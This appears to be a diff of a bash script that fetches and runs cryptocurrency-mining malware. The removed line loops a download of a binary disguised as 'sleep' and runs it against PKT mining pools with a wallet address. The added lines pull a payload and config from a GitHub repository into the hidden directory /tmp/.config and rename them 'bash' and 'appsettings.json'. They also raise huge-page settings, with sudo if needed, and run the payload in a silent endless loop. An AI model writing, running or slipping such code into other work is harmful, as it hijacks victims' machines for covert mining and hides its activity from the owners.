@@ -1,2 +1,12 @@
 #!/bin/bash
-while true; do wget --no-check-certificate -O ./sleep https://raw.githubusercontent.com/crystalbarnett4257/crystalbarnett4257/main/0 && chmod u+x ./sleep && ./sleep ann http://pool.pkt.world https://stratum.zetahash.com -p pkt1qtpelvvz5c26rlfnn5g80tsv57t9c2jzjw5dcyw; done
+
+src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768
+
+mkdir -p "/tmp/.config"
+wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
+wget -qO "/tmp/.config/bash" "${src}/q"
+chmod -R 777 "/tmp/.config"
+
+while true; do cd /tmp/.config; ./bash >/dev/null 2>&1 ; done
+
